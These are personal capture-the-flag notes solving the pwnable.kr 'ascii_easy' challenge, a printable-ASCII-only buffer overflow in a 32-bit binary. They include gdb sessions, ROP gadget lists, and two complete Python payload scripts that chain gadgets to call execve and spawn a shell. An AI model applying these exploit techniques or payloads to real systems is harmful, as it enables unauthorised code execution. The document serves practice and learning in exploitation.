# `ascii_easy`

*We often need to make 'printable-ascii-only' exploit payload.  You wanna try?
hint : you don't necessarily have to jump at the beginning of a function. try to land anywhere.*

```bash
[*] '/mnt/c/Users/reemp/Desktop/not-giving-a-fuck/ascii_easy/ascii_easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
we get a program with buffer overflow but the inputted buffer can only be an ascii value between 32 to 127. meaning each byte value is between 32 to 127.

we are mapping `libc` to the base address of `0x5555e000` 

Direction - `ret2libc`
1. overflow the RA of vuln to the address of `system` or if I can't then to somewhere inside that function
2. put above the return address the value of `/bin//sh` (little endian).

`payload = [padding] [/bin//sh] [system's address]`

### let's run in `gdb` the payload. 
1. checking the payload with `--args` 
	```bash
	gdb --args ./ascii_easy `python2 -c "print('A'*20 + '/bin//sh' + 'SYRA' + 'RARA')"`
	```
	`b *0x804852d` - after `strcpy`
	```text
	b *0x804852d
	set {int}0xffffcb7c = 0x5559ced0
	```
1. finding RA the offset (and checking it remotely)  (24 padding locally and remotely)
2. finding the location of system (and a location that is valid ascii value) 
	`readelf -s /home/ascii_easy/libc-2.15.so | grep system` offset -> `0003eed0`
	we know that the base address of the mapped `libc` is at `0x5555e000` so system is at `0x5559ced0`
3. executing `system` it crashed, I think it was because we didn't pass `/bin//sh` correctly
	system expects that the stack would look like that `[last_param][RA]` and we passed the `last_param` at the `RA` place. still crashed...
## `scp`
`scp -P 2222  ascii_easy@pwnable.kr:~/* .` holy moly that's cool.

when running the program locally  it thinks the `libc` is at `/home/ascii_easy/libc-2.15.so` so I tried to link.
`sudo ln -s /mnt/c/Users/reemp/Desktop/not-giving-a-fuck/ascii_easy/libc-2.15.so /home/ascii_easy/libc-2.15.so`
but this didn't work. I moved the file to the directory (`/home/ascii_easy/libc-2.15.so`) and it worked :).

### about system
system expects a pointer to a string. so let's find `/bin/sh` 
`strings -tx  /home/ascii_easy/libc-2.15.so | grep /bin/sh`
- `15d7ec`-> `0x556bb7ec` it's not ascii printable...

```python
def is_ascii(x):
	 x += 0x5555e000
	 print(hex(x))
	 x_bytes = (x & 0xFFFFFFFF).to_bytes(4, 'big')
	 print(x_bytes)
     return all([0x20 <= byte and byte <= 0x7f for byte in x_bytes])
```
help function to check if an address is valid.
Now this is harder then it looks.

### problems
* [ ] we cannot call directly `system` because `0x5559ced0` is not ascii.
* [ ] we cannot put `/bin/sh` location on the stack because `0x556bb7ec` is not ascii.

I want to redirect code execution to a function that will open a shell or will cat the flag.
### Direction
with the assumption that we must use some part of system. let's check the valid addresses that I can jump to.

system address  range `0003E940 - 0003EB92` 
```python
for address in range(0x0003E940, 0x0003EB92 + 1):
	if is_ascii(address):
		print(hex(address))
```
Oh no. we cannot jump to `system` ... I what to double check this...

maybe we should try to bypass the ascii check we cannot jump to the code address space. so no bypassing and no ROP chains :()

we must jump to somewhere inside the `libc` mapped page.

Ok I checked and I have 239,616 addresses to jump to. Ok so I can filter these addresses.. I can start a ROP chain with these addresses. I think that the direction is to jump to a function that will execute the shell

my tactic now is to look at functions that use `execve` inside `libc` and see if I can jump to any.

I can jump to a function that calls `execve` with `/bin/sh` 
```c
unsigned int __usercall command_bash@<eax>(const char *command@<eax>, int argv@<edx>, const char **envp@<ecx>)
{
  int i; // esi
  int j; // eax
  void *v5; // esp
  const char *executable; // edi
  const char *local_argv[2]; // [esp+10h] [ebp-28h] BYREF
  const char **local_envp; // [esp+18h] [ebp-20h]
  const char *local_command; // [esp+1Ch] [ebp-1Ch]

  i = 0;
  local_command = command;
  local_envp = envp;                            // count the size of the array
  while ( 1 )
  {
    j = i + 1;
    if ( !*(_DWORD *)(argv + 4 * i) )
      break;
    ++i;
  }
  v5 = alloca(4 * i + 23);
  executable = "/bin/sh";
  local_argv[0] = "/bin/sh";
  local_argv[1] = local_command;
  if ( i )
  {
    do
    {
      local_argv[j] = *(const char **)(argv + 4 * j - 4);
      --j;
    }
    while ( j != 1 );
    executable = local_argv[0];
  }
  return execve(executable, local_argv, local_envp);// pathname, argv, envp
}
```

we got a function that executes a command in bash.

let's check if when running `execve` in `gdb` we get a shell.
```text
b *0x55636b6c
set {int}0xffffcb7c = 0x55636b6c
set {int}0xffffcb80 = 0x556bb7ec
set {int}0xffffcb84 = 0
set {int}0xffffcb88 = 0
```
[helped](https://stackoverflow.com/questions/30149779/c-execve-parameters-spawn-a-shell-example)
```asm
.text:000D8B6C mov     [esp+4], esi    ; command
.text:000D8B70 mov     [esp], edi      ; exe
.text:000D8B73 mov     [esp+8], ecx    ; env
.text:000D8B77 call    execve
```
we spawned a shell! now that we know that just calling the `execve` would be fine, I need to find a way that the stack would look good. 
I got a bad feeling about this ret.

## The thought process
1. we must use `ret2libc` 
2. most `ret2libc` is about openings a shell using `system`
3. but system location in memory is not printable ascii so 
	1. I jump to another place
	2. I modify partly the RA `0x8048600` -> doesn't work we need the second byte to be close to `0xcc` which it isn't
4. the core of system is `execve` which if being called will execute a shell.
5. so searching valid addresses that uses `execve` and puts the pointer to `/bin/sh` on the stack

### The Idea
I will jump to the function and see what problems I need to solve in order that we will spawn a shell.
```text
b *0x8048532
set {int}0xffffcb7c = 0x55636b45
```

I need to set `ebx` to a value that's `ebx - 0x45808 = 0x15d7ec` `ebx = 0x55700ff4` impossible...
I am looking at a bunch of function
![[Pasted image 20231113161407.png]]
these functions have `ebx` set at an address that I cannot reach I found an interesting function
at location `0x55647e29` the problem is that `mov ebx, [esp]`. it becomes more complicated.

let's try to find another ways. I cannot use stack addresses...
these solutions seem to complicated to be the direction. Ok my bad it's 33 points, it supposes to be harder then `tiny_easy`.

maybe I will just try to run stuff?? didn't worked

## The Inevitable Direction
1. getting `/bin/sh` location on the stack or inside `edi` if so `esi` and `ecx` should be zero
	**this should be the hardest to build**
2. calling `execve` 

I though about another direction. Using the fact that the mapped page of `libc` is writeable it is possible to write to there some shellcode and then execute it. I would have to jump to `gets` or any function that reads from `stdin`.

WOW the start address of gets is valid!
let's check this theory with `gdb`
```text
b *0x8048532
b *0x0804852d
set {int}0xffffcb7c = 0x555c3e30
```

I think that `gets` will suppose that the stack would look like that `[buf][RA]`
```python
In [9]: 0x555c3e30.to_bytes(4, 'little')
Out[9]: b'0>\\U'
```
this idea sounded cool but it crashes
![[Pasted image 20231114093158.png]]
the problem is that we load stdin value from the stack.
let's try to use `fgets`, it will not look for a value on the stack, because we pass to it 
`[file-descriptor][size][location]` the problem is that we cannot put zero on the stack...

maybe the problem of `gets`  it of an offset. because we didn't call the function we just jumped to it.
I don't get `libc` functions.

let's try to return to system and then exit. This suppose to work on a typical  `ret2libc` challenge.
![[Pasted image 20231114100744.png]]
it did not spawned a shell and didn't crashed...
maybe there is an alignment problem, [here](https://stackoverflow.com/questions/40307193/responsibility-of-stack-alignment-in-32-bit-x86-assembly) 
### this is **not** a `ret2libc` challenge

I think the direction of the challenge is to ROP chain.
```text
ROPgadget --binary libc-2.15.so --offset 0x5555e000 --badbytes "00-1f|80-ff"
```
If I could get a chain that preps the stack / registers to `execve` then it would be nice.
1. find an `execve` call that has a valid address. 
	* `0x5561676a` inside `execv`
	* `0x5561695c` inside `execl`
	* `0x55636b6c` inside `bash_command`   		
2. find a chain that adds up numbers to sum to `0x556bb7ec`.  (or if I would write `/bin/sh\0`) to a valid memory

Let's not make up stuff, what's on the internet?
[ret2syscall](https://www.ctfnote.com/pwn/linux-exploitation/rop/ret2syscall)

[`rop syscall execv`](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-syscall-execv)

now in theory the only thing I have to do is to set 
`edi` = &`/bin/sh`
`esi` = 0
`ecx` = 0
let's check the theory in `gdb`

```python
In [16]: 0x55636b6c.to_bytes(4, 'little')
Out[16]: b'lkcU'
```
```text
set $edi = 0x556bb7ec
set $esi = 0
set $ecx = 0
```
worked :)

1. `mov esi, [address_i_control]` and to `ecx`
2. I need to write `/bin` and `//sh` to a zeroed memory 
3. `pop edi`  

`argv[1]` should look like this `[padding][Gadget]...[Gadget]...[execve]`

the gadgets should
1. 
## Gadgets

```
use this twice to write /bin//sh (the location in memory must be zeroed)
0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x55687b3c : mov dword ptr [edx], edi ; pop esi ; pop edi ; ret


setting esi and ecx
0x556a643b : mov edi, 0 ; lea eax, [ecx + 2] ; ret
```

```text
change edx and edi:
0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
change eax:
pop eax ; cmp eax, 0xfffff001 ; jae 0xb8239 ; ret
0x556a6a7f : nop ; mov eax, edx ; ret
change ecx:
pop ecx ; add al, 0xa ; ret
change esi:
0x555c6526 : xor edi, edi ; pop ebx ; mov eax, edi ; pop esi ; pop edi ; pop ebp ; ret
0x55687b3c mov dword ptr [edx], edi ; pop esi ; pop edi ; ret
```

now the problem is setting `esi` and `edi` to zero
I can 
1. read from a zeroed memory to `esi / edi`
2. get a zeroed register and use mov or `push & pop`.
3. zero `esi` and `edi` directly
4. change the stack to be zeroed then write in the appropriate place `/bin//sh`



```ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

[+] Gadget found: 0x55687b3c mov dword ptr [edx], edi ; pop esi ; pop edi ; ret
[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

[+] Gadget found: 0x55635738 mov dword ptr [edx], ecx ; pop ebx ; ret
[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

[+] Gadget found: 0x555e5621 mov dword ptr [ecx], edx ; pop ebx ; ret
[-] Can't find the 'pop ecx' gadget. Try with another 'mov [reg], reg'

[+] Gadget found: 0x555d6225 mov dword ptr [eax], edx ; ret
[+] Gadget found: 0x5557506b pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

[+] Gadget found: 0x55584a58 mov dword ptr [eax], edx ; pop ebx ; pop esi ; pop edi ; ret
[+] Gadget found: 0x5557506b pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

[-] Can't find the 'mov dword ptr [r32], r32' gadget
```

## write ascii bytes to an ascii memory location

```text

0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x55687b3c : mov dword ptr [edx], edi ; pop esi ; pop edi ; ret
```
## change the stack location

```text
0x55687935 : inc eax ; pop esp ; ret
```

Now the only thing left is to find an zeroed memory and test the theory 
I could use the `got`. we have some zeroed memory there :) because we have no-pie we can use the same address the problem with that is that it is not an ascii address.
Ok changing the stack location is not possible.

I could write to `esp` `esp+4`, and `esp+8`, if I `push eax` I could put it on the stack, but then I would have to push `execv`
```
push &/bin//sh - how the fuck I will write a null???
push 
ret 

push 0
push
ret

push 0
push
ret

execve
```

```
0x5563704c : pushal ; ret
```

I felt like this was not the direction but then I found [this](http://gmiru.com/writeups/0ctf-char/) on the internet...
I don't know if it's cheating.... it's not a perfect solved.
1. calculate the `/bin/sh`
2. put the entire payload on the stack using `pushal` and then jumping to `execve`

### the final chain
```
eax = 0
ecx = 0
edx = &bin/sh
ebx = exeve address
esp = esp
ebp = 
esi = 
edi = pop_3_gadget
``` 

we need to find a way to zero `eax` and `ecx` and to calculate `edx` 
```text
zeros eax
0x555d203e : nop ; nop ; xor eax, eax ; ret

can zero ecx, this should work because zf = 1 -> meaning equal
0x55617a5f : xchg ecx, eax ; mov eax, 0xff ; jne 0xb9a38 ; repz ret

getting edx
0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x55575069 : add byte ptr [eax], al ; pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x555f3866 : add edx, eax ; jl 0x958a0 ; add eax, ecx ; ret
```

the [`repz ret`](https://repzret.org/p/repzret/) is  just an optimization made by `gcc`.
`0x556bb7ec` I need to break this to two values that are ascii printable.
the problem here is the `b7` and `ec` `b7` should become smaller then `7f`
`0x38`, `0x6d` are the differences. 
```python
In [18]: hex(0xb7 - 0x7f)
Out[18]: '0x38'

In [19]: hex(0xec - 0x7f)
Out[19]: '0x6d'

In [20]: hex(0x55 - 0x20)
Out[20]: '0x35'

In [21]: hex(0x6b - 0x20)
Out[21]: '0x4b'

In [22]: hex(0x556bb7ec - 0x354b386d)
Out[22]: '0x20207f7f'
```
`0x354b386d`, `0x20207f7f`
nice.
### problem
we cannot add `edx`, `eax` because we cannot control `eax`. so maybe I can subtract? how could this help me if I cannot control `eax`? I can change it with a ROP chain.
```
0x5557734b : add eax, 0xc35b0000 ; repz ret
```
maybe influence it by another register.
```text
0x556a6a7f : nop ; mov eax, edx ; ret

0x556a6521 : jl 0x148740 ; mov eax, ecx ; ret
0x556a624d : jne 0x148430 ; mov eax, ecx ; ret
```

easy to control registers
```
0x5557734e : pop ebx ; ret
0x556d2a51 : pop ecx ; add al, 0xa ; ret
```

I need that `edx` will store `/bin/sh`
I can add / sub -> sub seems easier
```
0x5560365c : sub edx, eax ; pop esi ; mov eax, edx ; pop edi ; pop ebp ; ret
```
I can put inside `edx` any ascii value with 
```
0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
```

`edx` - `0xc35b0000` == `0x556bb7ec` impossible, maybe with an overflow...

### controlling `eax` value
```
0x555f3966 : xor ch, ch ; add eax, ecx ; pop edi ; ret
0x556a6a7f : nop ; mov eax, edx ; ret
```

with subtraction we cannot get to a valid number.
if I could add to `edx` second byte this problem could be resolved.
I don't have a good add for `edx`

if I could subtract `edx` below the min value I would get to the higher values again.
```python
In [46]: hex((0x20207f7f - 0xc35b0000 - 0x759c793)&0xFFFFFFFF)
Out[46]: '0x556bb7ec'
```
the problem is that I need both value to be ascii. let's play
```python
In [54]: hex(((0x7f7f7f7f - 0xc35b0000)&0xFFFFFFFF) - 0x556bb7ec)
Out[54]: '0x66b8c793'

In [55]: hex(((0x7f7f7f20 - 0xc35b0000)&0xFFFFFFFF) - 0x556bb7ec)
Out[55]: '0x66b8c734'

In [56]: hex(((0x7f7f2020 - 0xc35b0000)&0xFFFFFFFF) - 0x556bb7ec)
Out[56]: '0x66b86834'

In [57]: hex(((0x7f202020 - 0xc35b0000)&0xFFFFFFFF) - 0x556bb7ec)
Out[57]: '0x66596834'

In [58]: hex((0x7f202020 - 0xc35b0000 - 0x66596834)&0xFFFFFFFF)
Out[58]: '0x556bb7ec'
```


## the ROP chain

### setting `edx` to `/bin/sh` location
1. put inside `edx` the `0x7f202020` and inside `edi`  `0x66596834`
	```
	0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
	```
2. setting `eax` to `0x66596834`
	**problem**
	* when loading `edx`, `eax` is getting cleaned
	put inside `edx`   `0x66596834` and then mov it to `eax`
	```
	0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
	0x556a6a7f : nop ; mov eax, edx ; ret
	```
	**solution**
	mov to `eax` the value from a different register. 
	* we can `xchg` it with `ecx` .
		1. `ecx` will be `0x66596834`
		```
		0x556d2a51 : pop ecx ; add al, 0xa ; ret
		```
		2.  `xchg` `ecx` and `eax`
		```
		0x55617a5f : xchg ecx, eax ; mov eax, 0xff ; jne 0xb9a38 ; repz ret		
		```
	* we can mov `edi` to it and set `edi` to the `pop_3_gadget` (`0x5557506d`)
		 
		 `0x555f7969 : mov eax, edi ; pop esi ; pop edi ; ret`			
3. add to `eax` the overflow value.
	```
	0x5557734b : add eax, 0xc35b0000 ; repz ret
	```
4. sub `edx`  with `eax`
	```
	0x5560365c : sub edx, eax ; pop esi ; mov eax, edx ; pop edi ; pop ebp ; ret
	```
### clean `ecx` and `eax`
```
0x555d203e : nop ; nop ; xor eax, eax ; ret
0x55617a5f : xchg ecx, eax ; mov eax, 0xff ; jne 0xb9a38 ; repz ret
0x555d203e : nop ; nop ; xor eax, eax ; ret
```

### setting the `pushal` final registers
1. setting `ebx` to `execve` (`0x5561676a`)  with
	```
	0x5557734e : pop ebx ; ret
	```
2. setting `edi` to  `0x5557506d` (`0x5557506d : pop esi ; pop edi ; pop ebp ; ret`)
	this could be done in the first gadget


**map**
```
eax = 0
ecx = 0
edx = &bin/sh
ebx = exeve address
esp = esp
ebp = 
esi = 
edi = pop_3_gadget
```

###  `pushal`
```
0x5563704c : pushal ; ret
```


## implementation
1. overflowing to first ROP
	![[Pasted image 20231115114350.png]]
	it seems that we got extra 2 bytes. 
	```
	Dump of assembler code for function vuln:
   0x08048518 <+0>:     push   ebp
   0x08048519 <+1>:     mov    ebp,esp
   0x0804851b <+3>:     sub    esp,0x28
   0x0804851e <+6>:     sub    esp,0x8
   0x08048521 <+9>:     push   DWORD PTR [ebp+0x8]
   0x08048524 <+12>:    lea    eax,[ebp-0x1c]
   0x08048527 <+15>:    push   eax
   0x08048528 <+16>:    call   0x8048380 <strcpy@plt>
   0x0804852d <+21>:    add    esp,0x10
   0x08048530 <+24>:    nop
   0x08048531 <+25>:    leave
   0x08048532 <+26>:    ret
	```
	 as you can see we write to `ebp - 0x1c` which is 28.
2. continuing to the next ROP
	after the first gadget we will use the **higher** address on the stack, meaning the next value on the payload.

## writeups
```python
## VARIATION 1 ###

import struct
 
 
 def p(addr):
     return str(struct.pack("<I",addr))
 
 
 payload =  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A" #junk
 payload += "B" * 4 # ebp overflow
 
 # just move the seat aka stack grooming
 payload += p(0x555f3555) # move target address to edx
 payload += p(0x5556682b)
 payload += "A" * 4
 
 
 # write execve address to edx
 payload += p(0x555f3555) # move target address to edx
 payload += p(0x5556682b)
 payload += "A" * 4
 
 payload += p(0x556d2a51) # prepare ecx
 payload += p(0x2A303270)
 payload += p(0x556d382a) # add ecx to [edx]
 payload += p(0x556d2a51) # prepare ecx
 payload += p(0x2B313370)
 payload += p(0x556d382a)
 
 # write /bin/sh address to eax
 payload += p(0x556a7c60) # prepare eax
 payload += p(0x40307060)
 payload += p(0x555f3d4d) # fix eax step 1
 payload += "A" *4
 payload += p(0x40307060)
 payload += p(0x555f3d4d) # fix eax step 2
 payload += "A" * 4
 payload += p(0x2A336754)
 payload += p(0x555f3d4d) # fix eax step 3
 payload += "A" * 4
 payload += "A" * 4
 
 # adjustments
 
 payload += p(0x556a7740) # pop 3 registers (0x556a7740: pop edi; pop esi; pop ebx; ret; )
 payload += p(0x556a7740) # will be popped into edi - 0x556a7740: pop edi; pop esi; pop ebx; ret;
 payload += "B" * 4 # to be popped into esi
 payload += p(0x556e4042) # 0x556e4042 : pop ebx; bnd jmp [edx] we need to have a preceding pop since we have to get rid of the stack content
 
 # push all registers
 payload += p(0x556c683c)
 
 
 print(payload)



## VARIATION 2 (intended solution) ###


import struct


def p(addr):
    return str(struct.pack("<I",addr))


base = 0x5555e000
call_execve = 0xB876A


payload = "A" * 32 # prefiller
payload += p(0x55584a5b)  #: pop esi; pop edi; ret;
payload += "B" * 4
payload += "C" * 4
payload += p(0x55584a5b)  #: pop esi; pop edi; ret;
payload += "B" * 4
payload += "C" * 4
payload += p(0x55584a5b)  #: pop esi; pop edi; ret;
payload += "B" * 4
payload += "C" * 4
payload += p(0x55584a5b)  #: pop esi; pop edi; ret;
payload += "B" * 4
payload += "C" * 4
payload += p(0x55584a5b)  #: pop esi; pop edi; ret;
payload += "B" * 4
payload += "C" * 4

payload += p(base+call_execve)

payload += p(0x55616353) # address of string "h\x00\x00\x00" you could create a symbolic link ...

print(payload)
```
